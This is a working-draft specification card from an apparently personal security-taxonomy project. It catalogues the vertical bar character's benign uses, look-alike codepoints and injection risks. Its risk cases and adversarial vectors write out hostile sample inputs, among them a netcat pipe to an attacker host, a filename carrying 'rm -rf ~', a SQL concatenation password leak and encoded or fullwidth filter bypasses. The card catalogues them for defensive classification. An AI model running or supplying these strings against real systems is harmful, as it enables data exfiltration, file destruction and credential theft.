PRIVATE AUTHORED PROJECT / COMMERCIAL USE PROHIBITED

DOCUMENT_ID: SIGN_CORE_CARD_VERTICAL_LINE_U007C_GEN3_v0_3_EN
DOCUMENT_TYPE: SIGN_CORE_CARD
TEMPLATE_LINE: GEN3_v0_3
DOCUMENT_STATUS: WORKING_DRAFT
STATUS: WORKING_DRAFT / NOT_LOCKED / NOT_RUNTIME / NOT_VALIDATOR / NOT_PRODUCTION / NOT_CONVEYOR_RUN
SOURCE_TEMPLATE: SIGN_CORE_CARD_TEMPLATE_GEN3_v0_3_EN
BASED_ON_RULESET: SIGN_CORE_CARD_CONVEYOR_RULES_GEN3_v0_3_EN
TRANSLATION_NOTE: English mirror of SIGN_CORE_CARD_VERTICAL_LINE_U007C_GEN3_v0_3_RU (authoritative). Codepoints, field names and formulas identical. DRAFT for our work (Vakhter); conveyor is a separate project.

============================================================
0. UNIVERSALITY
============================================================
BOUND_TO_SPECIFIC_SIGN: YES
AFTER_USE_RESIDUE: FORBIDDEN
SIGN_DATA_IS_SESSION_ONLY: YES

============================================================
1. COMMON_CONVEYOR_DISCIPLINE
============================================================
CONVEYOR_DISCIPLINE_VERSION: v0_3
RUN_CARD_REQUIRED_BEFORE_LOCK: YES
LOCKED_WORKING_CORE_SELF_ASSIGNMENT: FORBIDDEN
MODEL_FAMILY_DIVERSITY_REQUIRED: YES
ADVERSARIAL_EVIDENCE_REQUIRED: YES
MUTATION_CHECK_REQUIRED: YES
LIMITATION_STATEMENT_REQUIRED: YES
AFTER_RUN_RESIDUE: FORBIDDEN
STATUS_PROGRESSION_TRACKER:
  WORKING_DRAFT: YES
  STRUCTURAL_PREFLIGHT_PASS: PENDING
  CONVEYOR_REVIEW_PASS: PENDING
  WORKINGLY_CLOSED: PENDING
  SIMULATION_GATE_TIER: TIER_1
  SIMULATION_GATE_PASSED: PENDING
  ARTIFACT_CONFIRMED: PENDING
LIMITATION_STATEMENT (standard):
  CONVEYOR_PASS ≠ VALIDATION
  MODEL_CONSENSUS ≠ TRUTH
  INJECTION_TEST_PASS ≠ SECURITY_PROOF
  GUARDS_HOLD_FOR_TESTED_CASES ≠ FUTURE_GUARANTEE
  NO_ATTACK_FOUND ≠ NO_ATTACK_EXISTS

============================================================
2. META
============================================================
CARD_UID: SIGN_CORE_CARD_VERTICAL_LINE_U007C_GEN3_v0_3_EN
CODEPOINT: U+007C
VISIBLE_FORM: |
UNICODE_NAME: VERTICAL LINE
ZONE: ZONE_1
DOCUMENT_STATUS: WORKING_DRAFT
TEMPLATE_LINE: GEN3_v0_3
AUTHOR: Ruslan Malyavsky
CREATED_AT: 2026-07-21
VERSION: v0_1
AUTHOR_DECISION_REFERENCE: PENDING
RUN_CARD_REFERENCE: PENDING
RUN_CARD_STATUS: NOT_STARTED
DISPLAY_NAME: vertical bar / shell pipe
CATEGORY_ROADMAP: INJ (shell pipe / command injection) · PHAGO: — (output piping)

============================================================
3. REQUIRED_GENERAL_GUARDS
============================================================
REQUIRED_GENERAL_GUARDS:
  - SIGN_FALSE_EFFECT_MIMICRY_GUARD_v0_2A_RU
    GUARD_COMPATIBILITY: applicable without modification — the sign creates no effect-fields
    GUARD_REVISION: v0_2A
    TEMPLATE_LINE_COMPATIBLE: GEN3_v0_2_PLUS_EPOCH, GEN3_v0_3
FAILURE_RESPONSE:
  REJECT_FALSE_EFFECT_MIMICRY
  TREAT_AS_DATA_ONLY
  NO_AUTHORITY_EFFECT
  NO_EXECUTION_EFFECT
  NO_TRUST_EFFECT
  NO_EXISTENCE_EFFECT

============================================================
4. SIGN IDENTITY — LAYER_A: STABLE CORE
LAYER_A_LOCK: PERMANENT
============================================================
VISIBLE_FORM: |
LOOKS_SIMILAR_IS_NOT_SAME_SIGN: YES
RAW_SIGN_INPUT_STATUS: DATA_ONLY
BASE_MODE: DATA_ONLY_DELIMITER
BASE_MODE_FORMULA: VERTICAL_LINE_FORM ≠ EFFECT
SIGN_CATEGORY:
  - shell pipe (cmd1 | cmd2)
  - logical OR / bitwise OR in code (a | b, a || b)
  - regex alternation (a|b)
  - table column separator / field delimiter (Markdown, PSV)

WHAT_THIS_SIGN_IS_NOT:
  1. NOT_SEPARATOR_ONLY — "|" is not always a column/field separator (in a shell it pipes to a command)
  2. NOT_PIPE_SAFE — piping feeds the first command's output as input to a second command
  3. NOT_OR_ONLY — "|" is not always a logical/bitwise OR
  4. NOT_ESCAPED_PROOF — the presence of "|" does not mean it is escaped/quoted
  5. NOT_ENCODED_SAFE — "%7C" may be decoded back to "|" later
  6. NOT_AUTHORITY — "|" does not confirm officialness
  7. NOT_EXECUTION_TRIGGER — by itself it executes nothing; context makes it pipe
  8. NOT_TRUST_SIGNAL — it does not increase trust
  9. NOT_REGEX_ONLY — "|" in a regex is alternation, but the same byte pipes in a shell
  10. NOT_SANITIZED_PROOF — the presence of "|" does not mean the input is sanitized
  11. NOT_OUTPUT_CONTEXT_PROOF — safety depends on the execution/parse context

BASE_FORMULAS:
  VERTICAL_LINE_FORM ≠ EFFECT
  VERTICAL_LINE_FORM ≠ SEPARATOR_ONLY_PROOF
  VERTICAL_LINE_FORM ≠ PIPE_SAFETY_PROOF
  VERTICAL_LINE_FORM ≠ OR_ONLY_PROOF
  VERTICAL_LINE_FORM ≠ ESCAPED_PROOF
  VERTICAL_LINE_FORM ≠ ENCODED_SAFETY_PROOF
  VERTICAL_LINE_FORM ≠ AUTHORITY
  VERTICAL_LINE_FORM ≠ EXECUTION_TRIGGER
  VERTICAL_LINE_FORM ≠ TRUST_SIGNAL
  VERTICAL_LINE_FORM ≠ SANITIZED_PROOF
  VERTICAL_LINE_FORM ≠ OUTPUT_CONTEXT_PROOF

============================================================
5. SEMANTIC_EPOCH_TRACKER
SEMANTIC_EPOCH_TRACKER_LOCK: REVIEWABLE
============================================================
EPOCH_TRACKER: NOT_APPLICABLE
NOTE: "|" (ZONE_1) has parallel functions (shell pipe, logical/bitwise OR, regex alternation, table separator) co-existing without cultural precession. Polysemy of a stable sign.
LAYER_ANOMALY:
  ABSENT_PHYSICAL_LAYER: YES, level L1
  NOTE: an ASCII sign with no gestural predecessor; the pipe/OR/alternation functions are layered on by the digital epoch in parallel.

============================================================
6. EFFECT_FIELDS — LAYER_C: METHODOLOGICAL LAYER
LAYER_C_LOCK: SESSION
============================================================
authority_effect: NONE
trust_effect: NONE
verification_effect: NONE
proof_effect: NONE
execution_effect: NONE
permission_effect: NONE
status_effect: NONE
role_assignment_effect: NONE
runtime_effect: NONE
existence_effect: NONE
EFFECT_FIELDS_ALL_NONE: YES
CLOSED_SCHEMA: YES

============================================================
7. SAFE / RISK / CONFUSABLES / GUARDS — LAYER_B
LAYER_B_LOCK: REVIEWABLE
============================================================
SAFE_CASES:
  SAFE_CASE_001:
    INPUT: "| Name | Age |"
    CONTEXT: a Markdown table header
    EXPECTED: INFO
    RISK: NONE
    GUARD: VERTICAL_LINE_FORM ≠ SEPARATOR_ONLY_PROOF
  SAFE_CASE_002:
    INPUT: "flags = READ | WRITE"
    CONTEXT: bitwise OR in code (as literal text)
    EXPECTED: INFO
    RISK: NONE
    GUARD: VERTICAL_LINE_FORM ≠ EFFECT
  SAFE_CASE_003:
    INPUT: "cat|dog|bird"
    CONTEXT: a regex alternation (as literal text)
    EXPECTED: INFO
    RISK: NONE
    GUARD: VERTICAL_LINE_FORM ≠ OR_ONLY_PROOF
  SAFE_CASE_004:
    INPUT: "a|b|c (PSV data row)"
    CONTEXT: a pipe-separated values field list
    EXPECTED: INFO
    RISK: NONE
    GUARD: VERTICAL_LINE_FORM ≠ SEPARATOR_ONLY_PROOF
  SAFE_CASE_005:
    INPUT: "if (x || y)"
    CONTEXT: logical OR in code
    EXPECTED: INFO
    RISK: NONE
    GUARD: VERTICAL_LINE_FORM ≠ EFFECT
  SAFE_CASE_006:
    INPUT: "P(A|B) (conditional probability notation)"
    CONTEXT: a "given" bar in math prose
    EXPECTED: INFO
    RISK: NONE
    GUARD: VERTICAL_LINE_FORM ≠ EFFECT

RISK_CASES:
  RISK_CASE_001:
    NAME: SHELL_PIPE_INJECTION
    INPUT: "cat file | nc attacker 4444"
    CONTEXT: piping output to an attacker command
    RISK: CRITICAL
    ATTACK: "|" feeds output to a second command (exfil/exec)
    GUARD: VERTICAL_LINE_FORM ≠ PIPE_SAFETY_PROOF
  RISK_CASE_002:
    NAME: FILENAME_PIPE_EXEC
    INPUT: "photo.jpg| rm -rf ~"
    CONTEXT: a pipe hidden in a filename passed to a shell
    RISK: CRITICAL
    ATTACK: "|" turns a "filename" argument into a command pipeline
    GUARD: VERTICAL_LINE_FORM ≠ SEPARATOR_ONLY_PROOF
  RISK_CASE_003:
    NAME: SQL_CONCAT_LEAK
    INPUT: "1 || (SELECT password FROM users)"
    CONTEXT: "||" string concatenation to leak data (Oracle/Postgres)
    RISK: HIGH
    ATTACK: "||" concatenates a subquery result into the output
    GUARD: VERTICAL_LINE_FORM ≠ OR_ONLY_PROOF
  RISK_CASE_004:
    NAME: ENCODED_PIPE_BYPASS
    INPUT: "cmd%7C rm -rf ~ (with a later decode)"
    CONTEXT: an encoded "|" decoded back before execution
    RISK: HIGH
    ATTACK: %7C decodes to "|" AFTER the check → pipeline
    GUARD: VERTICAL_LINE_FORM ≠ ENCODED_SAFETY_PROOF
  RISK_CASE_005:
    NAME: REGEX_ALTERNATION_BYPASS
    INPUT: "admin|root (in an auth allow-list regex)"
    CONTEXT: an unescaped "|" widens a regex match unexpectedly
    RISK: MEDIUM
    ATTACK: "|" makes the pattern match more than intended (auth bypass)
    GUARD: VERTICAL_LINE_FORM ≠ OR_ONLY_PROOF
  RISK_CASE_006:
    NAME: FULLWIDTH_PIPE_BYPASS
    INPUT: "cmd｜rm （fullwidth ｜ U+FF5C）"
    CONTEXT: a look-alike to bypass a "|" filter
    RISK: MEDIUM
    ATTACK: a filter looks for ASCII "|", a normalizer may fold ｜ to "|"
    GUARD: VERTICAL_LINE_FORM ≠ EFFECT

CONFUSABLES:
  CONFUSABLE_001:
    VISIBLE_FORM: ｜
    CODEPOINT: U+FF5C
    NAME: FULLWIDTH VERTICAL LINE
    RISK: HIGH
    RULE: FULLWIDTH_VERTICAL_LINE ≠ VERTICAL_LINE (bypasses a filter looking for ASCII "|")
  CONFUSABLE_002:
    VISIBLE_FORM: ∣
    CODEPOINT: U+2223
    NAME: DIVIDES
    RISK: MEDIUM
    RULE: DIVIDES ≠ VERTICAL_LINE
  CONFUSABLE_003:
    VISIBLE_FORM: │
    CODEPOINT: U+2502
    NAME: BOX DRAWINGS LIGHT VERTICAL
    RISK: MEDIUM
    RULE: BOX_LIGHT_VERTICAL ≠ VERTICAL_LINE
  CONFUSABLE_004:
    VISIBLE_FORM: ǀ
    CODEPOINT: U+01C0
    NAME: LATIN LETTER DENTAL CLICK
    RISK: LOW
    RULE: DENTAL_CLICK ≠ VERTICAL_LINE
  CONFUSABLE_005:
    VISIBLE_FORM: ￨
    CODEPOINT: U+FFE8
    NAME: HALFWIDTH FORMS LIGHT VERTICAL
    RISK: LOW
    RULE: HALFWIDTH_LIGHT_VERTICAL ≠ VERTICAL_LINE

CONTRADICTION_GUARDS:
  CG1:
    TRIGGER: "'|' is always a table/field separator"
    RESPONSE: VERTICAL_LINE_FORM ≠ SEPARATOR_ONLY_PROOF
    RULE: in a shell "|" pipes output to a second command
  CG2:
    TRIGGER: "a pipe just passes text, it cannot run anything"
    RESPONSE: VERTICAL_LINE_FORM ≠ PIPE_SAFETY_PROOF
    RULE: the pipe launches and feeds a second executable
  CG3:
    TRIGGER: "since the input reached execution, '|' is already safe"
    RESPONSE: VERTICAL_LINE_FORM ≠ OUTPUT_CONTEXT_PROOF
    RULE: safety depends on the parse/execution context; use argument-vector exec
  CG4:
    TRIGGER: "'%7C' is safe forever"
    RESPONSE: VERTICAL_LINE_FORM ≠ ENCODED_SAFETY_PROOF
    RULE: the encoded form may be decoded back to "|" before execution
  CG5:
    TRIGGER: "an ASCII '|' filter catches all bars"
    RESPONSE: VERTICAL_LINE_FORM ≠ EFFECT
    RULE: fullwidth ｜ (U+FF5C) and box │ (U+2502) are different codepoints
  CG6:
    TRIGGER: "the presence of '|' means the input is sanitized"
    RESPONSE: VERTICAL_LINE_FORM ≠ SANITIZED_PROOF
    RULE: the presence of the sign says nothing about sanitization

SEQUENCE_LAYER_BOUNDARY:
  SIGN_SAFE_ALONE ≠ SIGN_SAFE_IN_SEQUENCE: YES
  SEQUENCE_CANDIDATES:
    SC1:
      SEQUENCE: "| "
      NAME: SHELL_PIPE
      RISK_LEVEL: CRITICAL
      POSSIBLE_CONTEXTS: piping to a second shell command
      REQUIRES_SEQUENCE_INTEGRATOR: YES
    SC2:
      SEQUENCE: "||"
      NAME: OR_OR_CONCAT
      RISK_LEVEL: HIGH
      POSSIBLE_CONTEXTS: shell OR-execution / SQL string concatenation leak
      REQUIRES_SEQUENCE_INTEGRATOR: YES
    SC3:
      SEQUENCE: "|&"
      NAME: PIPE_STDERR
      RISK_LEVEL: HIGH
      POSSIBLE_CONTEXTS: piping stdout+stderr to a second command
      REQUIRES_SEQUENCE_INTEGRATOR: YES
  IF NOT_APPLICABLE: not applicable — sequences with "|" are central to command/pipe injection.

PHAGO_ENTITY_MIMICRY:
  NOT_APPLICABLE:
    REASON: "|" pipes/routes output to another command, but does not imitate the existence of a verified entity. Its risks are injection/piping, not entity mimicry.
    REVIEW_REQUIRED: YES

============================================================
8. ADVERSARIAL_COVERAGE — RUN_CARD SEED
============================================================
MIN_TOTAL_VECTORS: 10 (5 categories A-E, CATEGORY_F NOT_APPLICABLE for ZONE_1)
CATEGORY_A: FORM_MANIPULATION (2)
  A1: substitution of ASCII "|" with fullwidth ｜ (U+FF5C) to bypass a filter
  A2: substitution with box-drawing │ (U+2502)
CATEGORY_B: CONTEXT_INJECTION (2)
  B1: shell pipe cat file | nc attacker 4444
  B2: SQL concat 1 || (SELECT password FROM users)
CATEGORY_C: SEQUENCE_MANIPULATION (2)
  C1: "| " (SC1) — shell pipe
  C2: "||" (SC2) — OR-exec / concat leak
CATEGORY_D: SEMANTIC_MIMICRY (2)
  D1: "|" presented as a harmless table separator inside a command field
  D2: "%7C" as "safe" encoded text with a later decode
CATEGORY_E: PHAGO_ENTITY_MIMICRY (2)
  E1: N/A — the sign is not a PHAGO carrier; vector: pipe into an OS-command template
  E2: N/A — vector: filename-with-pipe passed to a shell
CATEGORY_F: SEMANTIC_LAYER_MANIPULATION
  NOT_APPLICABLE
  REASON: ZONE_1, the sign has no dormant/active epochs.
ACTUAL_TOTAL_VECTORS: 10
COVERAGE_STATUS: SUFFICIENT (10 ≥ 10)

============================================================
9. MUTATION_CHECK
============================================================
MUTATION_01:
  CLAIM: "|" is always a table/field separator
  EXPECTED: FAIL_SEPARATOR_ONLY_MIMICRY
  RESULT: FAIL
MUTATION_02:
  CLAIM: a pipe just passes text and cannot run anything
  EXPECTED: FAIL_PIPE_SAFETY_MIMICRY
  RESULT: FAIL
MUTATION_03:
  CLAIM: since the input reached execution, "|" is already safe
  EXPECTED: FAIL_OUTPUT_CONTEXT_MIMICRY
  RESULT: FAIL
MUTATION_04:
  CLAIM: "%7C" is safe forever
  EXPECTED: FAIL_ENCODED_SAFETY_MIMICRY
  RESULT: FAIL
MUTATION_05:
  CLAIM: an ASCII "|" filter catches all bar look-alikes
  EXPECTED: FAIL_CONFUSABLE_COVERAGE_MIMICRY
  RESULT: FAIL
MUTATION_06:
  CLAIM: the presence of "|" proves the input was sanitized
  EXPECTED: FAIL_SANITIZED_MIMICRY
  RESULT: FAIL

============================================================
10. KNOWN_OPEN_QUESTIONS
============================================================
OQ1:
  QUESTION: how to neutralize "|" per context (shell/SQL/regex) without false positives on tables/PSV/OR?
  STATUS: CLOSED_AS_DELEGATED_TO_INTEGRATOR (argument-vector exec + parameterized queries + regex-escaping is an integrator/runtime concern)
  BLOCKS_WORKINGLY_CLOSED: NO
  NOTE: the card fixes the rule "the safety of '|' is decided by the execution/parse context".
ALL_OPEN_QUESTIONS_CLOSED: NO (delegated, non-blocking)

============================================================
11. PATCH_HISTORY
============================================================
PATCH_HISTORY:
  v0_1_PATCH_01: initial creation (Ruslan Malyavsky, 2026-07-21) — draft from the GEN3_v0_3 template (Vakhter); not conveyor-run.
PATCHES_APPLIED: 1
PATCHES_VERIFIED: 0/1

============================================================
12. LIMITATION_STATEMENT
============================================================
LIMITATION_STATEMENT:
  THIS_CARD IS A WORKING_DRAFT ARTIFACT (until ARTIFACT_CONFIRMED)
  NOT A FINAL_STANDARD
  NOT A PARSER
  NOT A RUNTIME
  NOT A SECURITY_CERTIFICATE
  NOT_CONVEYOR_RUN (draft for our work; conveyor is a separate project)
  CONVEYOR_PASS ≠ VALIDATION
  RUN_CARD_RESULT ≠ FINAL_STATUS
  WORKINGLY_CLOSED ≠ ARTIFACT_CONFIRMED

============================================================
13. INTEGRATION_INTERFACE_STATUS
============================================================
INTEGRATION_INTERFACE_STATUS:
  STATUS: READY_PENDING_CONCRETE_INTEGRATOR
  ATTACHED_INTEGRATOR_UID: NONE_CURRENTLY_ATTACHED
  ACTIVE_MODULES_COUNT: 0
  RUNTIME_ATTACHMENT: NONE
  PERMANENT_BINDING: NO
  SESSION_ONLY_BINDING: YES
  AFTER_RUN_RESIDUE: FORBIDDEN

============================================================
END_OF_DOCUMENT
